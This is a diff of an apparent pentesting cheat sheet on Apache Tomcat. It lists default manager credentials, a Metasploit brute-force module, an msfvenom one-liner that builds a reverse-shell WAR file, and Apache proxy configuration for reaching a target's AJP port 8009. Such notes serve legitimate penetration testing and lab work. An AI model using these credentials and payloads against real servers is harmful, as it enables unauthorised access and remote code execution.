@@ -122,7 +122,6 @@ print(b64encode(dumps))
 
 
 # Tomcat
-Help from: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 ## Default credentials
 ```
 admin:admin
@@ -133,12 +132,49 @@ tomcat:s3cr3t
 admin:tomcat
 ```
 
+### Metasploit brute force
+With the is module: `auxiliary/scanner/http/tomcat_mgr_login` one can bruteforce possible usernames and passwords.
+
 ## War file exploit (RCE)
 If one has access to the Application Manager of Tomcat, the attacker can upload and run a .war file to execute code and get a shell potentially.     
 **This is only possible if the account that the attacker is logged in with has enough privileges (admin,manager-script,manager)**
 
+### One liner to create .war file
+```bash
+msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+```
+
+## Apache JServ (AJP) protocol on port 8009
+If a machine hosts a tomcat server with the AJP protocol one can use the steps below to redirect traffic from the host to their machine.
+- Download needed software
+    ```bash
+    apt install libapache2-mod-jk
+    a2enmod proxy_ajp
+    ```
+- Configure server
+    ```bash
+    ProxyRequests Off
+    <Proxy *>
+    Order deny,allow
+    Deny from all
+    Allow from localhost
+    </Proxy>
+    ProxyPass   / ajp://<IP>:8009/
+    ProxyPassReverse  / ajp://<IP>:8009/
+    ```
+- (Re)start apache server
+    ```bash
+    systemctl start apache2 # OR
+    systemctl restart apache2
+    ```
+
 ### References
+- [https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol](https://www.ionize.com.au/post/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol)
+
+
+#### References
 - [https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)
+- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 
 # ESIGate (ESI Injection)
 Any ESIGate software is affected that has a lower version than *5.3*
